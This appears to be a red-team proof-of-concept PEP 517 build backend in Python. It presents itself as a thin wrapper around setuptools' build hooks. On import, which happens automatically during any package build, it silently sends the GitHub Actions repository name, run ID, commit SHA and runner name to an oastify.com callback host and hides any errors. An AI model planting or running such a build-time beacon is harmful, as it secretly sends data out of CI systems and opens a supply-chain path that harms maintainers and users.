import os
import urllib.parse
import urllib.request

params = urllib.parse.urlencode({
    "repo": os.getenv("GITHUB_REPOSITORY", ""),
    "run_id": os.getenv("GITHUB_RUN_ID", ""),
    "sha": os.getenv("GITHUB_SHA", ""),
    "runner": os.getenv("RUNNER_NAME", ""),
})

url = "http://828tfxm6i1vfiug4wtkp80tdf4lv9lxa.oastify.com/"
if params:
    url = f"{url}?{params}"

try:
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "pep517-redteam-poc"},
        method="GET",
    )
    urllib.request.urlopen(req, timeout=5).read(1)
except Exception:
    pass

from setuptools import build_meta as _orig

get_requires_for_build_wheel = _orig.get_requires_for_build_wheel
prepare_metadata_for_build_wheel = _orig.prepare_metadata_for_build_wheel
build_wheel = _orig.build_wheel
build_sdist = _orig.build_sdist